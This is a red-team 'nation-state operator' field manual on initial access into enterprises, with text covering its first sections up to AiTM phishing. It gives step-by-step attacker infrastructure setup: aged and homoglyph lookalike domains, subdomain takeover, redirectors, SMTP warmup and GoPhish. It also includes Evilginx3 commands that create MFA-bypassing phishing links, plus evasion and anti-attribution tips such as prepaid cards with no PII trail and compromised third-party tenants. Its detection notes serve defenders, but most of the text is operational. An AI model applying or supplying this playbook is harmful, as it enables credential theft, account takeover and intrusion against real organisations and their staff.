# Initial Access — Nation-State Operator Field Manual

> **Classification:** Comprehensive initial access reference for APT operations. Every technique includes MITRE ATT&CK mapping, OPSEC rating, detection signatures, and Q1-Q2 2026 viability assessment. Assumes passive + active reconnaissance complete (see `01-passive-recon-cheatsheet.md` and `02-active-recon-cheatsheet.md`).
>
> **Environment baseline:** Modern enterprise — Windows 10/11 + Server 2019/2022/2025, MDE-class EDR with AMSI/ETW/ASR/Tamper Protection/LSA Protection/Credential Guard, hybrid Entra ID with Conditional Access + PIM + MFA + Identity Protection + Authentication Strengths + Token Protection (native apps), **Microsoft Defender for Identity (MDI)** monitoring DCs, **Defender for Cloud Apps (MDCA)** for SaaS visibility, **Defender XDR** cross-product correlation, SIEM (Sentinel/Splunk/Elastic), 24/7 SOC with automated containment, NDR (Vectra/Darktrace/ExtraHop), CSPM (Wiz/Lacework/Orca).
>
> **Initial-access OPSEC taxonomy:** Each technique rated on:
> - **STEALTH** (LOW / MEDIUM / HIGH / VERY HIGH) — how hard to attribute / detect at point of action
> - **SUCCESS RATE** (LOW / MED / HIGH) — typical engagement outcome against modern enterprise baseline
> - **SKILL** (LOW / MEDIUM / HIGH / VERY HIGH) — operator expertise required
> - **DETECTION COST** (NEAR-ZERO / LOW / MEDIUM / HIGH) — how much defender attention the action costs you

---

### Support This Work

If these cheatsheets save you time, consider buying me a coffee.

<a href="https://www.buymeacoffee.com/NoVanity" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50"></a>

**Or scan:**

<img src="https://github.com/MentalVibes/RedTeamCheatSheets/blob/4077a94d94806ba6e6513c29e1410bcda23894d1/qr-code.png" alt="Buy Me A Coffee QR" width="200">

**Crypto:**

| Currency | Address |
|----------|---------|
| **ETH** | `0x3844c08bb832b086d00dbbfec128cb31bdcca838` |

*Accepts ETH, USDC, and any ERC-20 token on Ethereum, Base, Polygon, and other EVM chains.*

---

## Table of Contents

- [0 — Initial Access Decision Matrix + 2026 Reality Framing](#0--initial-access-decision-matrix--2026-reality-framing)
- [1 — Attack Infrastructure Setup](#1--attack-infrastructure-setup)
- [2 — Phishing: Credential Theft & Session Hijack](#2--phishing-credential-theft--session-hijack)
- [3 — Phishing: Payload Delivery](#3--phishing-payload-delivery)
- [4 — Credential Attacks](#4--credential-attacks)
- [5 — Exploit Public-Facing Application](#5--exploit-public-facing-application)
- [6 — External Remote Services](#6--external-remote-services)
- [7 — Cloud & Identity-Plane Initial Access](#7--cloud--identity-plane-initial-access)
- [8 — Supply Chain & Trusted Relationship](#8--supply-chain--trusted-relationship)
- [9 — Physical Access & Hardware Implants](#9--physical-access--hardware-implants)
- [10 — OPSEC & Detection Reference](#10--opsec--detection-reference)
- [11 — Operational Checklist](#11--operational-checklist)
- [12 — Tool Quick Reference (Maintenance Status)](#12--tool-quick-reference-maintenance-status)
- [13 — MITRE ATT&CK Mapping Matrix](#13--mitre-attck-mapping-matrix)

---

## 0 — INITIAL ACCESS DECISION MATRIX + 2026 REALITY FRAMING

```
═══════════════════════════════════════════════════════════
INITIAL ACCESS METHOD COMPARISON (2026 reality-weighted)
═══════════════════════════════════════════════════════════
METHOD                       │ STEALTH  │ SUCCESS │ SKILL    │ DET COST │ BEST AGAINST
─────────────────────────────┼──────────┼─────────┼──────────┼──────────┼──────────────────
AiTM phishing (Evilginx3)    │ MED-HIGH │ HIGH    │ MEDIUM   │ MEDIUM   │ O365/cloud orgs
AiTM-as-a-Service            │          │         │          │          │
  (Mamba 2FA, EvilProxy,     │ MED      │ HIGH    │ LOW      │ MEDIUM   │ O365/cloud orgs
   Sneaky 2FA — post-Tycoon) │          │         │          │          │
Help Desk Vishing            │ MED-HIGH │ HIGH    │ MEDIUM   │ HIGH     │ Mature-MFA orgs
                             │          │         │          │          │ (esp. retail/insurance/
                             │          │         │          │          │  airline 2025 wave)
AI-augmented spearphishing   │ HIGH     │ MED-HIGH│ MEDIUM   │ LOW      │ Distributed workforce
Deepfake voice/video vishing │ HIGH     │ HIGH    │ HIGH     │ HIGH     │ C-suite, finance teams
Device code phishing         │ HIGH     │ MED     │ LOW      │ LOW      │ Tenants without CA
                             │          │         │          │          │ Auth Flows policy
                             │          │         │          │          │ (enforcement Sept 2024)
ClickFix / paste-and-run     │ MEDIUM   │ HIGH    │ LOW      │ MEDIUM   │ Remote workforce
Edge device exploit          │ HIGH     │ HIGH    │ HIGH     │ LOW      │ Vulnerable VPN/firewall
                             │          │         │          │          │ (top vector 5th yr)
Infostealer creds (broker)   │ VERY HIGH│ MED-HIGH│ LOW      │ LOW      │ No-MFA SaaS tenants
Valid accounts (cred spray)  │ MEDIUM   │ MED     │ LOW      │ MEDIUM   │ Orgs without MFA
OAuth consent phishing       │ HIGH     │ MED     │ MEDIUM   │ MED      │ M365/Workspace/SaaS
Microsoft Teams external     │          │         │          │          │
  chat phishing              │ HIGH     │ MED     │ LOW      │ MEDIUM   │ Trusted-tenant orgs
SaaS-to-SaaS OAuth pivot     │ VERY HIGH│ HIGH    │ MEDIUM   │ LOW      │ Heavy-SaaS orgs
                             │          │         │          │          │ post-foothold
Spearphish + payload         │ MEDIUM   │ LOW-MED │ HIGH     │ HIGH     │ Endpoint-heavy orgs
Remote-tool implant          │          │         │          │          │
  (TeamViewer/AnyDesk/SCREEN-│ HIGH     │ HIGH    │ LOW      │ MEDIUM   │ Vishing follow-on
   CONNECT/Splashtop/Atera)  │          │         │          │          │ (Scattered Spider,
                             │          │         │          │          │  Akira, RansomHub)
Browser extension installer  │ HIGH     │ MED     │ MEDIUM   │ MEDIUM   │ Chrome-heavy users
Supply chain compromise      │ VERY HIGH │ LOW    │ VERY HIGH│ LOW      │ High-value targets
                             │          │         │          │          │ (XZ, Polyfill,
                             │          │         │          │          │  tj-actions)
Subdomain takeover phishing  │ HIGH     │ HIGH    │ MEDIUM   │ LOW      │ Targets with stale DNS
Watering hole                │ HIGH     │ LOW     │ HIGH     │ MEDIUM   │ Specific communities
Physical implant             │ VARIES   │ HIGH    │ MEDIUM   │ HIGH     │ Air-gapped / secure
Trusted relationship         │ HIGH     │ MEDIUM  │ MEDIUM   │ LOW      │ MSP/partner clients
                             │          │         │          │          │ (UK retail wave 2025)
SCIM API abuse               │ VERY HIGH │ MED    │ HIGH     │ LOW      │ Heavy-SaaS-federated
                             │          │         │          │          │ orgs
```

```
═══════════════════════════════════════════════════════════
2026 REALITY (verified primary-source statistics)
═══════════════════════════════════════════════════════════

INITIAL ACCESS VECTOR DISTRIBUTION (Mandiant M-Trends 2025, covering 2024):
  Source: https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2025
  - Exploits:                33% (down from 38% in 2023; top vector for 5th year)
  - Stolen credentials:      16% (up from 10% — overtook email phishing for 1st time)
  - Email phishing:          14% (down from 17%)
  - Web compromise:           9%
  - Prior compromise via     ~8% (combined with exploits + stolen creds = 57% of all cases)
    access brokers
  - Brute force:              6%
  - Other / unknown:         remainder

TOP 4 EXPLOITED VULNERABILITIES 2024 (all edge devices):
  - Palo Alto PAN-OS         CVE-2024-3400 (GlobalProtect cmd injection, CVSS 10.0)
  - Ivanti Connect Secure    CVE-2023-46805 + CVE-2024-21887 (auth bypass + cmd injection)
  - Fortinet FortiClient EMS CVE-2023-48788 (SQL injection → SYSTEM RCE)

REMOTE SERVICE PATTERNS (Sophos Active Adversary Report 2025):
  Source: https://www.sophos.com/en-us/blog/2025-sophos-active-adversary-report
  - RDP involved in 84% of IR/MDR cases in 2024 (down from 90% in 2023)
  - Compromised credentials = #1 root cause of attacks for 2nd year in a row (41%)

VISHING / SOCIAL ENGINEERING SURGE (CrowdStrike GTR 2025):
  Source: https://www.crowdstrike.com/en-us/press-releases/crowdstrike-releases-2025-global-threat-report/
  - 442% increase in vishing attacks in 2H2024 vs 1H2024
  - Driven primarily by GenAI-augmented social engineering
  - Scattered Spider / DragonForce affiliate ecosystem dominant

REGULATORY DRIVERS:
  CISA BOD 26-02 (issued 5 Feb 2026):
    Source: https://www.cisa.gov/news-events/directives/bod-26-02-mitigating-risk-end-support-edge-devices
    - Federal agencies must INVENTORY EOS edge devices by 5 May 2026
    - DECOMMISSION within 12-18 months
    - Driven by widespread exploitation of unsupported edge devices by APT actors
  → Operator implication: EOS appliances will receive NO patches; remain
    high-priority targets through 2026-2027 transition window

SCATTERED SPIDER / UNC3944 / OCTO TEMPEST DOMINANT PATTERN:
  CISA AA23-320A (joint advisory, last updated 29 Jul 2025):
    Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a
  Q3 2024 - Q3 2025 confirmed victim waves (Scattered Spider attribution):
  - MGM Resorts (Aug 2023, ~$100M reported impact)
  - Caesars Entertainment (2023)
  - Transport for London (Aug 2024)
  - Marks & Spencer / Co-op / Harrods (Apr-May 2025) via TCS contractor pivot
    (~£300M profit impact at M&S)
  - Erie Insurance (7 Jun 2025) / Philadelphia Insurance (9 Jun 2025) / Aflac
    (12 Jun 2025) — insurance sector wave (~13.9M PHI compromised)
  - WestJet (13 Jun 2025) / Hawaiian Airlines (26 Jun 2025) / Qantas
    (30 Jun 2025) — airline sector pivot (FBI alert issued)
  - Thalha Jubair (19, East London) arrested Sept 16, 2025 — DOJ charges
    cite $115M ransom attribution; TTP continues through affiliates

SALT TYPHOON (PRC) US TELECOM COMPROMISE:
  Source: https://www.congress.gov/crs-product/IF12798
  - 9+ US telcos compromised 2024-2025 (Verizon, AT&T, T-Mobile, Spectrum, etc.)
  - Lawful intercept (CALEA) systems accessed
  - Multi-year footholds documented
  - Operator implication: telecom-routed authentication paths (SMS MFA,
    voice OTP, callback verification) considered compromised in 2026

RECENT MASS-EXPLOITATION CVES (Q1-Q2 2026 OPERATOR LANDSCAPE):
  - CVE-2025-49706 + CVE-2025-49704 + CVE-2025-53770 — Microsoft SharePoint
    "ToolShell" zero-day chain; mass exploitation July 2025; 150+ orgs
    Source: https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/
  - CVE-2025-31324 — SAP NetWeaver Visual Composer (CVSS 10.0; April 2025)
  - CVE-2025-32433 — Erlang/OTP SSH server (CVSS 10.0; pre-auth RCE; April 2025)
  - CVE-2025-1097 — Ingress NGINX "IngressNightmare" (March 2025)
  - CVE-2025-30066 — tj-actions/changed-files supply chain (March 2025; 23k repos)
  - CVE-2025-22457 — Ivanti Connect Secure (UNC5221 mass exploit, April 2025)
  - CVE-2025-0282 — Ivanti Connect Secure stack overflow (Dec 2024 - Jan 2025)
  - CVE-2025-23120 — Veeam Backup & Replication domain-user RCE (March 2025)

PATTERN SHIFTS SINCE 2022:
  - Macro-based payloads DEAD for email delivery (Microsoft block, Jul 2022)
  - ISO/IMG MOTW bypass PATCHED (Nov 2022)
  - OneNote embedded scripts BLOCKED (Apr 2023)
  - Microsoft Authenticator number matching default (27 Feb 2023) — push
    bombing largely ineffective against Entra defaults
  - Token Protection GA Windows / preview macOS+iOS — blocks NATIVE app
    token replay; browser cookie replay STILL VIABLE
  - App-Bound Encryption (Chrome 127+, Aug 2024) broke in-process cookie
    extraction — operator workarounds: memory injection, COM bypass,
    DevTools injection (cat-and-mouse documented by Elastic Security Labs)
  - Continuous Access Evaluation (CAE) on SharePoint/Exchange/Teams —
    near-real-time token revocation outside compliant network
  - Snowflake mandatory MFA rollout post-UNC5537: April 2025 enrollment,
    August 2025 required, November 2025 full enforcement
  - Help desk social engineering = dominant MFA-bypass for financial-crime
    groups; airline + insurance + retail sector waves 2025
  - SaaS-to-SaaS OAuth pivot rising as cross-tenant attack vector
  - Tycoon 2FA disrupted March 2026 → Mamba 2FA / EvilProxy / Sneaky 2FA
    now leading PhaaS landscape
```

```
═══════════════════════════════════════════════════════════
TYPICAL INITIAL ACCESS CHAINS (operator sequencing patterns)
═══════════════════════════════════════════════════════════

NATION-STATE EDGE DEVICE CHAIN (M-Trends dominant pattern):
  Shodan/Censys scan for vulnerable edge appliance → pre-auth RCE via known
  CVE (Ivanti CVE-2024-21887, PAN-OS CVE-2024-3400, FortiOS CVE-2024-21762,
  Citrix Bleed CVE-2023-4966, Erlang/OTP CVE-2025-32433) → shell on appliance
  (no EDR) → extract VPN user creds + LDAP bind creds + NTDS snapshot from
  memory → pivot into AD via extracted credentials → Tier 2/1/0 climb.

FINANCIAL CRIME CHAIN (Scattered Spider / UNC3944 / DragonForce affiliate):
  OSINT employee profile (LinkedIn + infostealer log on personal device) →
  obtain valid user's credential, blocked by MFA → voice-phish IT help desk
  impersonating the user (panicked "new phone, need MFA reset" pretext) →
  optional deepfake voice for verification gate → help desk resets MFA,
  enrolls attacker device → authenticate to O365/VPN/Okta → install
  ScreenConnect/AnyDesk for persistence → lateral movement → data theft →
  DragonForce / RansomHub / Akira ransomware deployment.

INFOSTEALER + NO-MFA SAAS CHAIN (UNC5537/Snowflake pattern):
  Purchase infostealer log containing target employee's browser session →
  extract saved SaaS credentials (Snowflake, Salesforce, Atlassian, AWS
  console) → test against target's SaaS tenant → if MFA not enforced on
  the SaaS app, log in directly OR replay browser session cookie → enumerate
  data, bulk export → extort target AND their downstream customers.

AITM PHISHING CHAIN (SaaS cookie theft):
  Register lookalike domain + aged categorization OR claim dangling subdomain
  takeover → deploy Evilginx3 / muraena / commercial AiTM kit (Mamba 2FA,
  EvilProxy, Sneaky 2FA) → send phishing lure → victim enters creds + MFA on
  proxied real Microsoft login page → capture session cookie → import into
  attacker browser → full SSO access. Token Protection only blocks this on
  NATIVE apps, not browser-based SaaS.

LONG-GAME SUPPLY CHAIN (XZ Utils / SolarWinds / Polyfill pattern):
  Identify strategic OSS dependency or vendor product → operate sock-puppet
  accounts pressuring maintainer (XZ pattern) OR purchase domain associated
  with deprecated CDN-hosted library (Polyfill pattern) OR compromise CI/CD
  action (tj-actions pattern) → introduce subtle backdoor over months
  (obfuscated test fixtures, JS payload, build-time artifact swap) →
  downstream consumers pull malicious version → latent capability activated
  when operator decides. Two-year timeline typical for OSS social engineering;
  weeks for CI/CD action compromise.

HELP DESK → CLOUD → SAAS-TO-SAAS PIVOT CHAIN (hybrid identity expansion):
  Help desk vishing → MFA reset → access to Entra-joined workstation →
  harvest PRT and refresh tokens → session cookies → O365 access → enumerate
  installed OAuth grants via GraphRunner / GraphSpy → pivot via OAuth grants
  to Salesforce, Atlassian, GitHub Enterprise, ServiceNow without separate
  IdP authentication → register additional persistence (OAuth app, attacker
  device as compliant) → extended cloud identity persistence.

EDGE → ESXI RANSOMWARE CHAIN (current ransomware operator pattern):
  Vulnerable edge appliance exploit → internal pivot → identify VMware
  vCenter (CVE-2024-37079/80 if unpatched) → root vCenter → access ESXi
  hosts → encrypt VM datastores at hypervisor level (kills entire fleet
  faster than per-VM ransomware) → exfiltrate first via Veeam (CVE-2025-23120
  if backup server compromised). Standard 2024-2026 financial-crime pattern.
```

---

## 1 — ATTACK INFRASTRUCTURE SETUP

> **Typical chains through this section:** Aged domain procurement → categorization → TLS provisioning → SMTP warmup → C2 + redirector deployment → AiTM proxy infrastructure (or subdomain takeover for highest-credibility hosting). Infrastructure mistakes are the #1 burned-engagement cause.

### 1.1 — Domain & Certificate Preparation

```
═══════════════════════════════════════════════════════════
DOMAIN ACQUISITION & PREPARATION
MITRE ATT&CK: T1583.001 (Acquire Infrastructure: Domains),
              T1588.004 (Obtain Capabilities: Digital Certificates)
STEALTH: HIGH (when properly aged and categorized)
SUCCESS: HIGH (foundational — bad infrastructure burns operations fast)
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

DOMAIN AGE REQUIREMENT:
  - Microsoft Defender for Office 365 + Defender XDR raise URL risk score
    on domains < 30 days old (heuristic: "Newly observed domain" + 24h-7d
    age band → high score; 7d-30d → medium; >30d → reset to baseline)
  - Mature email gateways (Proofpoint, Mimecast, Abnormal Security) apply
    similar heuristics
  - PRACTICAL MINIMUM: 6 months age before operational use
  - BEST PRACTICE: 12+ months for high-stakes engagements

DOMAIN ACQUISITION PATHS:
  1. PURCHASE AGED DOMAIN via dropcatch / aftermarket auctions:
     - Sav.com, Dynadot, GoDaddy auctions, NameJet, SnapNames, DropCatch
     - Filter: age > 12 months, never abused (check VirusTotal historical),
       not on RBLs, clean Wayback history
  2. REGISTER AND AGE IN PARALLEL (slow):
     - Plant innocuous content (blog posts, business website)
     - Build minimal traffic baseline via legitimate referrals
     - Wait 6+ months before operational use
  3. SUBDOMAIN TAKEOVER (highest credibility, no domain purchase):
     - Identify target's dangling DNS records (CNAME pointing to
       deprovisioned cloud resource)
     - Tools: dnsx + subjack, nuclei takeovers/, can-i-take-over-xyz
     - Claim the deprovisioned resource (S3 bucket, Azure App Service,
       GitHub Pages, Heroku app, Fastly, etc.)
     - Now host phishing on TARGET's own subdomain — bypasses URL
       reputation entirely; bypasses lookalike-domain detection
     - RISK: target's monitoring tools may flag the dangling DNS itself

DOMAIN CATEGORIZATION:
  - Submit to web categorization services (target's web filter likely uses):
    Forcepoint URL DB, Symantec WebPulse, Cisco Talos, Fortiguard, Palo Alto
    URL Filtering, Zscaler ZIA, Cloudflare One
  - Categories that pass through enterprise filters: Business, Technology,
    Finance, Cloud Services, Collaboration
  - AVOID: Uncategorized (most enterprise filters block by default), Newly
    Registered Domain, Suspicious

LOOKALIKE DOMAIN PATTERNS:
  - Typo-squat:        target-login.com, taarget.com, target-sso.com
  - Hyphen insertion:  target-portal.com, target-mfa.com
  - TLD swap:          target.co (instead of .com), target.org, target.cloud
  - Subdomain spoof:   login-target.com, sso-target.com
  - IDN homoglyphs:    targеt.com (Cyrillic 'е' instead of Latin 'e')
                       microsоft.com (Cyrillic 'о'), pаypal.com (Cyrillic 'а')
  - Brand-adjacent:    target-secure.com, target-vault.com, target-auth.com
  - Department-specific: target-hr.com, target-it.com, target-payroll.com

TLS CERTIFICATE PROVISIONING:
  - Let's Encrypt (free, automated, legitimate cert): use certbot with
    --dns-cloudflare or --webroot for ACME-DNS-01
  - ZeroSSL (alternative free ACME provider; some deliverability advantage)
  - Paid certs from major CAs (Sectigo, DigiCert) for highest legitimacy
    on highest-stakes operations
  - VERIFY: Check Cert Transparency logs (crt.sh) — if your operational
    domain shows certs from prior abuse history, switch to fresh domain

PRE-DEPLOYMENT VERIFICATION:
  - VirusTotal: https://www.virustotal.com/gui/domain/<domain>
  - urlscan.io (search, do NOT submit — see passive recon §2.5 OPSEC)
  - any.run public sandbox: https://any.run/submissions
  - Talos Reputation: https://talosintelligence.com/reputation_center
  - WebPulse Site Review: https://sitereview.bluecoat.com/
  - If any service flags the domain → switch domains BEFORE operation
```

### 1.2 — Redirector Chains

```
═══════════════════════════════════════════════════════════
REDIRECTOR ARCHITECTURE
MITRE ATT&CK: T1090 (Proxy), T1090.002 (Proxy: External Proxy)
STEALTH: HIGH (hides actual C2 infrastructure)
═══════════════════════════════════════════════════════════

ARCHITECTURE PATTERN:
  Victim → HTTPS edge redirector → C2 server
                ↑
                └ Cloud function / VPS / CDN / Compromised legitimate site

CLOUD-FUNCTION REDIRECTORS (high source-IP legitimacy):
  - AWS Lambda + API Gateway (HTTPS endpoint that proxies to C2)
  - Azure Functions HTTP trigger
  - GCP Cloud Functions / Cloud Run
  - Cloudflare Workers (HTTPS at cloudflare.com edge — extreme legitimacy)
  - Vercel / Netlify edge functions
  Traffic source IP is the cloud provider's range — bypasses many ASN-based
  reputation filters; appears as legitimate cloud-hosted application traffic.

DOMAIN FRONTING (LIMITED VIABILITY 2026):
  - Original technique: TLS SNI says one CDN-hosted domain, HTTP Host header
    routes to another behind the same CDN
  - Major CDN providers (Cloudflare, AWS CloudFront, Azure, Google Cloud)
    have largely DISABLED domain fronting at the edge since 2018-2020
  - Still viable on: Fastly (limited), some smaller CDN providers,
    self-hosted reverse-proxy stacks
  - Cloudflare Workers can be used as a redirector that approximates
    the OPSEC benefit without domain fronting per se

APACHE / NGINX MOD_REWRITE REDIRECTORS:
  - Apache: .htaccess with rewrite rules that route C2 traffic to backend,
    serve benign decoy page to scanners (RewriteCond on User-Agent / IP /
    referrer)
  - nginx: similar via location blocks + proxy_pass
  - Sample logic: route only requests with specific cookie/header to C2;
    serve 200 OK + corporate-style HTML to all other requests

MALLEABLE C2 PROFILES:
  - Cobalt Strike: malleable C2 profiles match legitimate traffic patterns
    (Microsoft Update, CDN traffic, common SaaS apps)
  - Sliver: HTTP profile customization
  - Mythic / Havoc: per-agent traffic shaping
  - GOAL: blend with normal egress baseline; if SOC sees only "Microsoft
    Update traffic" in netflow, beacon traffic doesn't stand out

COMPROMISED LEGITIMATE SITE (HIGHEST STEALTH):
  - Compromise a low-traffic legitimate site (vulnerable WordPress / aging
    CMS) → install redirector script → traffic appears from genuinely
    legitimate domain
  - LEGAL EXPOSURE: compromising a third-party site is itself unauthorized
    access — engagement RoE must explicitly cover
  - Operator alternative: lease compromised infrastructure from underground
    "bulletproof hosting" markets (high legal exposure; varies by jurisdiction)
```

### 1.3 — SMTP Infrastructure

```
═══════════════════════════════════════════════════════════
EMAIL DELIVERY INFRASTRUCTURE
MITRE ATT&CK: T1583.001, T1585.002 (Establish Accounts: Email Accounts)
STEALTH: VARIES — see per-option
═══════════════════════════════════════════════════════════

OPTION 1: DEDICATED VPS + POSTFIX + DKIM/SPF/DMARC
  - Full operator control; mature OPSEC
  - Setup:
    apt install postfix opendkim opendkim-tools
    # Configure /etc/postfix/main.cf with hostname matching domain
    # Generate DKIM key: opendkim-genkey -t -s default -d <domain>
    # Add DKIM TXT record: default._domainkey.<domain>
    # Add SPF: v=spf1 ip4:<vps_ip> -all
    # Add DMARC: v=DMARC1; p=quarantine; rua=mailto:dmarc@<domain>
  - Warmup: 10-14 days of legitimate-looking outbound mail before
    operational phishing (gradually increasing volume; mix of recipient
    domains; no email gateway flags)

OPTION 2: COMPROMISED LEGITIMATE MAIL SERVER (HIGHEST DELIVERABILITY)
  - Use existing well-reputed mail server's IP/DKIM reputation
  - LEGAL EXPOSURE: same as compromised website (§1.2)

OPTION 3: CLOUD EMAIL API (SendGrid, Mailgun, Postmark, Amazon SES)
  - Fast spin-up; legitimate cloud-IP reputation for outbound
  - RISK: account burns fast on abuse reports; require credit card +
    account verification (attribution risk)
  - Operator pattern: rotate accounts per engagement; use prepaid card
    with no PII trail; expect 1-2 day operational window before suspension

OPTION 4: M365 / GOOGLE WORKSPACE COMPROMISED TENANT
  - Compromise a low-value tenant → use it for outbound phishing
  - Highest deliverability (Microsoft / Google sender reputation)
  - LEGAL EXPOSURE: third-party tenant compromise is unauthorized access
  - Observed pattern: financial-crime groups (Scattered Spider in particular)
    use compromised partner tenants for downstream-customer phishing

GOPHISH (CAMPAIGN MANAGEMENT):
  docker run -d --name gophish -p 3333:3333 -p 8080:8080 gophish/gophish
  # Admin: https://localhost:3333
  # Workflow: Sending Profile → Template → Landing Page → Campaign
  - Production caveat: GoPhish OSS is widely fingerprinted by email gateways
    (User-Agent strings, default landing-page artifacts, HTML structural
    patterns)
  - Mature operations: custom phishing infrastructure, NOT off-the-shelf
    GoPhish; OR heavily-modified GoPhish with custom Go-rebuilt agent

SMTP CONFIG VERIFICATION:
  - Check SPF: dig +short TXT <domain>
  - Check DKIM: dig +short TXT default._domainkey.<domain>
  - Check DMARC: dig +short TXT _dmarc.<domain>
  - Test deliverability: mail-tester.com (single-recipient test scoring)
  - Test rendering: emailonacid.com / litmus.com (cross-client preview)

DETECTION:
  - Email gateway: domain age, SPF/DKIM/DMARC alignment, IP reputation,
    payload analysis, URL rewriting
  - DMARC reporting (rua) reveals phishing-domain patterns to brand owners
    over time; targets often subscribe to dmarcian / Valimail for monitoring
  - Microsoft Defender for Office 365: Safe Links, Safe Attachments,
    ATP Anti-Phishing
  - Abnormal Security: behavioral inbox analysis; flags previously-unseen
    sender + financial-action context
```

### 1.4 — AiTM Proxy Infrastructure (Post-Tycoon Landscape)

```
═══════════════════════════════════════════════════════════
AiTM PROXY INFRASTRUCTURE — Q2 2026 LANDSCAPE
MITRE ATT&CK: T1557 (AiTM), T1583.001, T1090
STEALTH: MEDIUM-HIGH
SUCCESS: HIGH (against any non-FIDO2 / non-compliant-device-CA target)
═══════════════════════════════════════════════════════════

CURRENT PHaaS LANDSCAPE (April 2026):
  TYCOON 2FA: DISRUPTED MARCH 2026 by coordinated takedown
    (per Barracuda Threat Spotlight, April 2026:
    https://blog.barracuda.com/2026/04/16/threat-spotlight-tycoon-2fa-scattered-everywhere)
    - Pre-disruption: highest-volume AiTM PhaaS observed across 2024-2025
    - Post-disruption: 23M+ attacks observed using rebranded successor kits

  CURRENT LEADING KITS:
  - Mamba 2FA — leading post-Tycoon market share; rotating infrastructure;
    similar phishlet capability for Microsoft 365, Google, Okta
  - EvilProxy — older kit but rising post-Tycoon-disruption; subscription
    model; pre-built phishlets
  - Sneaky 2FA — emerging late-2025 entrant; aggressive obfuscation /
    anti-analysis; targeted at mature defender environments
  - ONNX Store — Microsoft-disrupted 2024; variant kits persist under
    different branding
  - EvilGoPhish — open-source GoPhish + AiTM hybrid; less capable but free

OPERATOR INFRASTRUCTURE (self-hosted Evilginx3 / muraena):
  - Aged domain (§1.1)
  - Wildcard TLS cert (covers login subdomains)
  - Dedicated VPS with reverse-proxy capacity
  - Phishlet for target IdP (Microsoft 365, Google Workspace, Okta, Auth0,
    PingOne, OneLogin, custom corporate SSO)
  - C2 callback for captured cookies (operator backend)

TYPICAL DEPLOYMENT (Evilginx3):
  evilginx3 -p /usr/share/evilginx/phishlets
  config domain yourdomain.com
  config ipv4 external <SERVER_IP>
  phishlets hostname o365 login.yourdomain.com
  phishlets enable o365
  lures create o365
  lures get-url 0
  # Output URL = AiTM phishing link

  Available phishlets in Evilginx3 community pack:
  o365, microsoft, microsoft-rdp, google, google-personal, okta, okta-mfa,
  github, gitlab, aws, linkedin, dropbox, twitter, facebook, instagram,
  outlook-personal, yahoo, citrix, salesforce, custom-saml

MURAENA (PHISHLET-COMPATIBLE EVILGINX ALTERNATIVE):
  - https://github.com/muraenateam/muraena (actively maintained as of 2026)
  - Phishlet syntax compatible with Evilginx; some operators prefer for
    different fingerprint pattern at the proxy layer

DETECTION (defender-side awareness):
  - Microsoft Entra Identity Protection: "Atypical sign-in properties",
    "Anonymous IP", "Suspicious browser", "Token issuer anomaly"
  - Microsoft Defender for Cloud Apps: "AiTM phishing attack" alert
    (specific signature on stolen-token replay from unmanaged device)
  - Conditional Access: "Require compliant device" + "Require Hybrid Azure
    AD joined device" — blocks token replay from attacker's unmanaged box
  - Token Protection (Conditional Access session control): blocks NATIVE
    app token replay; does NOT block browser-based session cookie replay
  - Entra ID sign-in logs: stolen-token replay shows as new user-agent
    + new IP for the same user, often with elevated risk score
  - Defender XDR: cross-product correlation alerts on identity-anomaly +
    rapid SaaS data access pattern
```

```
═══════════════════════════════════════════════════════════
SECTION 1 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §2 phishing campaigns (infrastructure foundation)
Enables → §8 supply chain operations (aged domain credibility)
Prereq → Passive recon §1 (target domain inventory) + §4 (employee list)
Cross-ref → §1.1 subdomain takeover = §7.8 cloud DNS dangling for
            phishing infrastructure
NEVER → Reuse infrastructure across engagements; one operation = one
        infrastructure stack; rotate domains, IPs, C2 keys, certs
```

---

## 2 — PHISHING: CREDENTIAL THEFT & SESSION HIJACK

> **Typical chains through this section:** Pretext development → infrastructure deployment (§1) → AiTM proxy OR direct credential capture OR consent grant abuse → MFA bypass via session-cookie replay or help-desk vishing → post-foothold cookie/token replay using GraphRunner / GraphSpy / TokenSmith → handoff to §7 cloud expansion or §6 remote-service entry.

### 2.1 — AiTM Phishing (Bypass MFA)

```
═══════════════════════════════════════════════════════════
ADVERSARY-IN-THE-MIDDLE PHISHING — PRIMARY 2026 MFA BYPASS
MITRE ATT&CK: T1557 (AiTM), T1566.002 (Spearphishing Link),
              T1539 (Steal Web Session Cookie), T1550.001 (App Access Token)
STEALTH: MEDIUM-HIGH    SUCCESS: HIGH    SKILL: MEDIUM
DETECTION: MEDIUM (cookie replay triggers identity-risk + device anomaly)
═══════════════════════════════════════════════════════════

WHAT BLOCKS AiTM (honest list — Q2 2026):
  - FIDO2 / passkeys with origin binding (hardware keys, Windows Hello,
    device-bound passkeys). The passkey refuses to authenticate to an
    origin that does not match the relying-party ID. SINGLE STRONGEST
    DEFENSE.
  - Certificate-based authentication with strong cert binding.
  - Entra ID Token Protection (Conditional Access session control) —
    BUT only for NATIVE applications (Outlook, OneDrive client, Teams
    client, etc.). Token Protection is GA on Windows; preview on
    macOS/iOS.
    CRITICAL CAVEAT: Token Protection does NOT protect BROWSER-based
    auth. AiTM via Evilginx against the browser login flow STILL WORKS
    even with Token Protection enforced, because the browser session
    cookie is not device-bound the same way the PRT is.
  - Compliant Network enforcement (Global Secure Access) — blocks token
    replay from outside the tenant's network. Cost-prohibitive for SMB.
  - Compliant-device Conditional Access requiring Entra-joined / Hybrid-
    joined device — attacker's unmanaged machine fails compliance check.
  - Continuous Access Evaluation (CAE) on SharePoint / Exchange / Teams
    — near-real-time revocation of replayed access tokens outside
    compliant network.
  - Authentication Strengths CA policy (GA March 2023): enforce specific
    MFA methods per resource (e.g., "FIDO2 only for finance apps").

WHAT DOES NOT BLOCK AiTM:
  - SMS / voice MFA — captured verbatim by the proxy
  - TOTP / authenticator app push — captured verbatim by the proxy
  - Number matching (mitigates push bombing, NOT AiTM)
  - Most standard CA policies that trust any signed-in user

EVILGINX3 — REVERSE PROXY (CAPTURES SESSION COOKIES + TOKENS):
  evilginx3 -p /usr/share/evilginx/phishlets
  config domain yourdomain.com
  config ipv4 external <SERVER_IP>
  phishlets hostname o365 login.yourdomain.com
  phishlets enable o365
  lures create o365
  lures get-url 0
  # Output: URL that proxies victim through your server to real Microsoft
